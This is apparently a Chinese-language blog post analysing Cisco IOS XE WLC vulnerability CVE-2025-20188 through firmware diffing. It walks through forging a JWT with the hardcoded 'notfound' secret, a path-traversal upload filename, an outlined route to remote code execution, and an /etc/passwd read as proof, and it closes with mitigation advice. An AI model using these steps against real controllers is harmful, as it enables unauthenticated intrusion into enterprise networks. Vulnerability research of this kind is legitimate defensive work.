<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="renderer" content="webkit"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/libs/highlight/styles/18k.css"><meta name="generator" content="Hexo 7.3.0"></head><body id="bodyx"><div class="hd posts"><a href="javascript:history.back()" class="replay-btn">返回</a><div class="post-title"><p></p><hr></div><div class="post-content"><hr><h2 id="title-思科-IOS-XE-WLC-文件上传漏洞-CVE-2025-20188date-2025-06-15-06-20-37tags"><a href="#title-思科-IOS-XE-WLC-文件上传漏洞-CVE-2025-20188date-2025-06-15-06-20-37tags" class="headerlink" title="title: 思科 IOS XE WLC 文件上传漏洞 CVE-2025-20188date: 2025-06-15 06:20:37tags: "></a>title: 思科 IOS XE WLC 文件上传漏洞 CVE-2025-20188<br>date: 2025-06-15 06:20:37<br>tags:</h2><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_2.jpg"></p><h1 id="思科-IOS-XE-WLC-任意文件上传漏洞-CVE-2025-20188-分析"><a href="#思科-IOS-XE-WLC-任意文件上传漏洞-CVE-2025-20188-分析" class="headerlink" title="思科 IOS XE WLC 任意文件上传漏洞 (CVE-2025-20188) 分析"></a>思科 IOS XE WLC 任意文件上传漏洞 (CVE-2025-20188) 分析</h1><p>近期一份<a target="_blank" rel="noopener" href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-wlc-file-uplpd-rHZG9UfC">思科的披露</a>详述了一个影响思科 IOS XE 无线控制器软件 17.12.03 及更早版本的一个漏洞。该问题被描述为一种未经身份验证的任意文件上传，由一个硬编码的 JSON Web Token (JWT) 的存在所引起。</p><p>思科 IOS XE 无线局域网控制器 (WLC)是一个广泛部署的企业级解决方案，用于管理和控制大规模无线网络。它集成在思科的 IOS XE 操作系统中，为园区和分支环境中的无线接入点提供集中管理、策略执行和无缝移动性。</p><p>我们的计划是看能否通过比较一个有漏洞的镜像和一个已打补丁的镜像来追溯该漏洞。我们首先获取了 C9800-CL-universalk9.17.12.03.iso 和 C9800-CL-universalk9.17.12.04.iso。在 ISO 存档中，我们发现了两个 .pkg 文件。虽然 <code>file</code> 命令没有提供太多有价值的信息，但 <code>binwalk</code> 却证明了其有效性。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_3.jpg" alt=".PKG Files"></p><p>很好！这证实了它是一个我们可以提取和探索的文件系统。</p><p>对文件系统的初步探索显示，Web 应用程序的核心组件位于 &#x2F;var&#x2F;www 和 &#x2F;var&#x2F;scripts 目录下。对文件的进一步检查表明，该应用程序是使用 OpenResty 构建的，这是一个将 Lua 与 Nginx 集成的 Web 平台。</p><p>我们将有漏洞和已打补丁的目录都加载到 VS Code 的<a target="_blank" rel="noopener" href="https://marketplace.visualstudio.com/items?itemName=moshfeu.compare-folders">差异比较扩展</a>中，并浏览每个目录以识别相关的文件差异。在位于 &#x2F;var&#x2F;scripts&#x2F;lua&#x2F;features&#x2F; 的 ewlc_jwt_verify.lua 和 ewlc_jwt_upload_files.lua 中发现了显著的变化。鉴于该漏洞与 JWT 处理有关，且这些文件都引用了 JWT 令牌和相关的密钥，这强烈表明我们正在调查正确的组件。</p><p>为了确定这些 Lua 脚本是如何以及在何处被调用的，我们在代码库中进行了一次简单的 grep 搜索。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_4.jpg" alt="Accessed LUA Files"></p><p>在 &#x2F;usr&#x2F;binos&#x2F;conf&#x2F;nginx-conf&#x2F;https-only&#x2F;ap-conf&#x2F;ewlc_auth_jwt.conf 内部我们看到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">location /aparchive/upload &#123;<br>    add_header X-Content-Type-Options nosniff;<br>    add_header X-XSS-Protection &quot;1; mode=block&quot;;<br>    charset_types text/html text/xml text/plain text/vnd.wap.wml application/javascript application/rss+xml text/css application/json;<br>    charset utf-8;<br>    client_max_body_size 1536M;<br>    client_body_buffer_size 5000K;<br><br>    set $upload_file_dst_path &quot;/bootflash/completeCDB/&quot;;<br>    access_by_lua_file /var/scripts/lua/features/ewlc_jwt_verify.lua;<br>    content_by_lua_file /var/scripts/lua/features/ewlc_jwt_upload_files.lua;<br>&#125;<br><br>#Location block for ap spectral recording upload<br>location /ap_spec_rec/upload/ &#123;<br>    add_header X-Content-Type-Options nosniff;<br>    add_header X-XSS-Protection &quot;1; mode=block&quot;;<br>    charset_types text/html text/xml text/plain text/vnd.wap.wml application/javascript application/rss+xml text/css application/json;<br>    charset utf-8;<br>    client_max_body_size 500M;<br>    client_body_buffer_size 5000K;<br>    set $upload_file_dst_path &quot;/harddisk/ap_spectral_recording/&quot;;<br>    access_by_lua_file /var/scripts/lua/features/ewlc_jwt_verify.lua;<br>    content_by_lua_file /var/scripts/lua/features/ewlc_jwt_upload_files.lua;<br>&#125;<br></code></pre></td></tr></table></figure><p>这揭示了在后端利用 ewlc_jwt_verify.lua 和 ewlc_jwt_upload_files.lua 的上传相关端点——完美！</p><p>第二个配置块表明 &#x2F;ap_spec_rec&#x2F;upload&#x2F; 端点首先由 ewlc_jwt_verify.lua 处理，它扮演一个访问阶段处理器的角色。如果请求通过验证，它随后被转发到 ewlc_jwt_upload_files.lua 以处理实际的上传。关于每个指令的更多细节可以在 <a target="_blank" rel="noopener" href="https://github.com/openresty/lua-nginx-module">OpenResty 文档</a>中找到。</p><p>ewlc_jwt_verify.lua 脚本从 &#x2F;tmp&#x2F;nginx_jwt_key 读取一个密钥，并用它来验证通过 Cookie 头或 jwt URI 参数提供的 JWT。如果密钥缺失，secret_read 会被设置为 notfound，这似乎是我们正在调查的硬编码 JWT 机制的一部分。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- ewlc_jwt_verify.lua<br>local jwt       = require &quot;resty.jwt&quot;<br>local jwt_token = ngx.var.arg_jwt<br><br>if jwt_token then<br>    ngx.header[&#x27;Set-Cookie&#x27;] = &quot;jwt=&quot; .. jwt_token<br>else<br>    jwt_token = ngx.var.cookie_jwt<br>end<br><br>local secret_read = &quot;&quot;<br>local key_fh = io.open(&quot;/tmp/nginx_jwt_key&quot;,&quot;r&quot;)<br>if ( key_fh ~= nil )<br>then<br>    io.input(key_fh)<br>    secret_read = io.read(&quot;*all&quot;)<br>    io.close(key_fh)<br>else<br>    secret_read = &quot;notfound&quot;<br>end<br>local jwt_comm_secret = tostring(secret_read)<br><br>local jwt_obj = jwt:verify(jwt_comm_secret, jwt_token)<br><br>if not jwt_obj[&quot;verified&quot;] then<br>    local site = ngx.var.scheme .. &quot;://&quot; .. ngx.var.http_host;<br>    local args = ngx.req.get_uri_args();<br><br>    ngx.status = ngx.HTTP_UNAUTHORIZED<br>    ngx.say(jwt_obj.reason);<br>    ngx.exit(ngx.HTTP_OK)<br>end<br></code></pre></td></tr></table></figure><p>为了确定 JWT 最初是在哪里生成的，我们运行了几个 grep 命令，并最终找到了 &#x2F;var&#x2F;scripts&#x2F;lua&#x2F;features&#x2F;ewlc_jwt_get.lua。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- ewlc_jwt_get.lua<br>local jwt = require &quot;resty.jwt&quot;<br>local json = require &#x27;cjson&#x27;<br>local req_id = ngx.req.get_headers()[&quot;JWTReqId&quot;]<br>local tcount = os.time()<br><br>--Give expiration time as 5 min<br>tcount = tcount+300<br><br>local secret = &quot;&quot;<br>local secret_sz =  64<br>local in_fh = io.open(&quot;/tmp/nginx_jwt_key&quot;,&quot;r&quot;)<br>if ( in_fh ~= nil )<br>then<br>    io.input(in_fh)<br>    secret = io.read(&quot;*all&quot;)<br>    io.close(in_fh)<br>else<br>    local random = require &quot;resty.random&quot;.bytes<br>    secret = random(secret_sz, true)<br>    if secret == nil then<br>        secret = random(secret_sz)<br>    end<br>    local key_fh = io.open(&quot;/tmp/nginx_jwt_key&quot;,&quot;w&quot;)<br>    if ( key_fh ~= nil ) then<br>        io.output(key_fh)<br>        io.write(secret)<br>        io.close(key_fh)<br>    end<br>end<br>local jwt_comm_secret = tostring(secret)<br><br>--Generate the jwt key<br>local jwt_gen_token = jwt:sign(<br>        jwt_comm_secret,<br>        &#123;<br>            header=&#123;typ=&quot;JWT&quot;, alg=&quot;HS256&quot;&#125;,<br>            payload=&#123;reqid=req_id, exp=tcount &#125;<br>        &#125;<br>    )<br>local response = &#123;token = jwt_gen_token&#125;<br>return ngx.say(json.encode(response))<br></code></pre></td></tr></table></figure><p>此脚本如果 &#x2F;tmp&#x2F;nginx_jwt_key 文件存在，则从中读取密钥；否则，它通过写入一个64字符的字节字符串来生成一个密钥。然后，它使用 jwt:sign() 创建一个 JWT，其载荷包含 JWTReqId 头和一个过期时间戳。</p><p>为了更好地理解这个流程是如何工作的，让我们尝试手动制作 JWT。首先，我们需要知道 JWTReqId 来自哪里。我们可以通过在代码库中进一步执行 grep 命令来找到它。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_5.jpg" alt="Script Code"></p><p>有趣的是，该头部是在一个 ELF 共享库中构建的：&#x2F;usr&#x2F;binos&#x2F;lib64&#x2F;libewlc_apmgr.so。为了更深入地挖掘，我们在 IDA Pro 中搜索 JWTReqId 字符串，这引导我们到了 ewlc_apmgr_jwt_request 函数。这让我们对 JWT 在内部是如何生成的有了更清晰的了解。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_6.jpg" alt="CRPG"></p><p>上述汇编代码显示，头部字符串是使用 snprintf 构建的。这里有一个有用的技巧是利用 LLM 来调查 s 变量的来源——它被用作头部字符串的一部分——特别是如果您不想在二进制文件中静态地追溯它。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_7.jpg" alt="LLM assisted investigation"></p><p>很好！交叉引用对 ewlc_apmgr_jwt_request 的调用显示只有一个引用！</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_8.jpg" alt="Cross checking code"></p><p>太好了，JWTReqId 头部包含 cdb_token_request_id1。</p><p>您可以尝试修改并运行该 Lua 脚本来生成 JWT，或者将其转换为 python（LLMs 在这方面也能提供帮助）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">import os<br>import time<br>import jwt<br><br>tcount = int(time.time()) + 300<br><br>req_id = &#x27;cdb_token_request_id1&#x27;<br><br>jwt_comm_secret = os.urandom(64)<br>jwt_gen_token = jwt.encode(<br>    &#123;&quot;reqid&quot;: req_id, &quot;exp&quot;: tcount&#125;,<br>    jwt_comm_secret,<br>    algorithm=&quot;HS256&quot;,<br>    headers=&#123;&quot;typ&quot;: &quot;JWT&quot;&#125;<br>)<br><br>print(jwt_gen_token)<br></code></pre></td></tr></table></figure><p>让我们用 JWT 试试上传端点</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_9.jpg" alt="JWT Request"></p><p>奇怪。</p><p>我们想起来，安全通告中提到了需要启用 Out-of-Band AP Image Download 功能。经过一番研究，我们发现在“Configuration”→“Wireless Global”下的“AP Image Upgrade”部分可以启用它。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_10.jpg"></p><p>这似乎是一个运行在端口 8443 上的独立服务，所以我们启用了它，并使用新端口重试了我们的请求。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_11.jpg" alt="Code Check"></p><p>成功了——我们得到了一个响应！这是一个 401 Unauthorized，伴随着一个签名不匹配的错误。这是预料之中的，因为当 JWT 不是用正确的密钥签名时，jwt:verify() 会失败。为了继续，我们需要使用 notfound 密钥重新生成 JWT。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_12.jpg" alt="Code check"></p><p>完美——我们得到了响应。此端点由位于 &#x2F;var&#x2F;scripts&#x2F;lua&#x2F;features&#x2F;ewlc_jwt_upload_files.lua 的脚本处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-- ewlc_jwt_upload_files<br>...<br>if method == &quot;POST&quot; then<br>    while true do<br>        local typ, req, err = form:read()<br>        if not typ then<br>            ngx.say(&quot;failed to read: &quot;, err)<br>            return<br>        end<br><br>        if typ == &quot;header&quot; then<br>            local file_name = getFileName(req)<br>            if not utils.isNil(file_name) then<br>                if not file then<br>                    file, err = io.open(location..file_name, &quot;w+&quot;)<br>                    if not file then<br>                        return<br>                    end<br>                end<br>            end<br>        elseif typ == &quot;body&quot; then<br>            if file then<br>                file:write(req)<br>            end<br>        elseif typ == &quot;part_end&quot; then<br>            if file then<br>                file:close()<br>                file = nil<br>            end<br>        elseif typ == &quot;eof&quot; then<br>            break<br>        end<br>    end<br>else<br>    ngx.say(&quot;Method Not Allowed&quot;)<br>    ngx.exit(405)<br>end<br></code></pre></td></tr></table></figure><p>文件将被写入 <code>location .. file_name</code>，其中 <code>location</code> 是 &#x2F;harddisk&#x2F;ap_spectral_recording&#x2F;，正如配置文件中通过以下方式定义的：<br><code>set $upload_file_dst_path /harddisk/ap_spectral_recording/;</code></p><p>没有什么能阻止我们使用 <code>..</code> 进行路径遍历，所以下一个问题是：我们应该把文件放在哪里？浏览 <a target="_blank" rel="noopener" href="https://10.0.23.70:8443/">https://10.0.23.70:8443/</a> 会显示默认的 OpenResty 主页。此页面是从 &#x2F;usr&#x2F;binos&#x2F;openresty&#x2F;nginx&#x2F;html 提供的，所以这是一个合乎逻辑的目标位置——我们将尝试把我们的文件放在那里。值得注意的是，这项服务不需要身份验证，使其成为利用上传路径的理想候选。</p><p>filename&#x3D;”..&#x2F;..&#x2F;usr&#x2F;binos&#x2F;openresty&#x2F;nginx&#x2F;html&#x2F;foo.txt”</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_13.jpg" alt="Code check"></p><p>成功！</p><h1 id="实现-RCE"><a href="#实现-RCE" class="headerlink" title="实现 RCE"></a>实现 RCE</h1><p>现在剩下要做的就是建立一种可靠的方法，利用这次上传来建立代码执行。可能有几种方法可以实现这一点，所以为了简洁起见，我们在这里会略过许多细节。</p><p>我们决定研究的一个途径是利用 <code>inotifywait</code> 的服务，这是一个允许监控指定目录中文件事件的实用程序。在深入研究这些服务后，我们发现了一个内部进程管理服务（pvp.sh），它会等待文件被写入特定目录。一旦检测到变化，它可以根据服务配置文件中指定的命令触发服务重载。</p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_15.jpg"></p><p><a target="_blank" rel="noopener" href="http://pvp.sh/"><em>pvp.sh</em></a> <em>代码片段</em></p><p>简而言之，为了实现 RCE，我们需要……</p><ul><li>… 用我们自己的命令覆盖现有的配置文件。</li><li>… 上传一个新文件以使服务重新加载。</li><li>… 检查我们是否成功。</li></ul><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_16.jpg" alt="Webkit Check"></p><p><em>修改后的配置文件</em></p><p><img src="http://www.18k.icu/images/20250615_06_v85hb79u/img_17.jpg" alt="Trigger file"></p><p><em>触发文件</em></p><p><code># curl -k https://10.0.23.70/webui/login/etc_passwd root:*:0:0:root:/root:/bin/bash binos:x:85:85:binos administrative user:/usr/binos/conf:/usr/binos/conf/bshell.sh bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin messagebus:x:998:997::/var/lib/dbus:/bin/false avahi:x:997:996::/var/run/avahi-daemon:/bin/false avahi-autoipd:x:996:995:Avahi autoip daemon:/var/run/avahi-autoipd:/bin/false guestshell:!:1000:1000::/home/guestshell: qemu:x:1001:1001:qemu::/sbin/nologin dockeruser:*:1000000:65536:Dockeruser:/:/sbin/nologin</code></p><p><em>输出验证</em></p><p>注意：在我们对新安装的 WLC 进行测试时，端口 8443 默认是开放的——即使没有明确启用 AP 镜像升级功能。这表明该服务可能在默认安装中已启用，并且易受攻击的端点是可访问的——至少在我们测试的 C9800 系列版本上是这样。</p><h1 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h1><p>最佳的缓解措施是升级到最新版本，因为思科已经修复了这个问题。然而，如果这不可行，思科表示管理员可以禁用 Out-of-Band AP Image Download 功能。禁用此功能后，AP 镜像下载将使用 CAPWAP 方法进行 AP 镜像更新，这不会影响 AP 客户端状态。思科强烈建议在能够执行升级之前实施此缓解措施。</p></div></div><div class="footer" id="footer"><p>Copyright © 2025 <a class="flink" target="_blank" rel="noopener" href="http://www.18k.icu">www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style="vertical-align:sub"><input type="checkbox" name="switch" id="update_style"> <span class="el-switch-style"></span></label></p></div><input type="hidden" id="web_style" value="black"> <input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz"> <input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf"><script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="/libs/highlight/highlight.pack.js"></script><script src="/js/js.js"></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>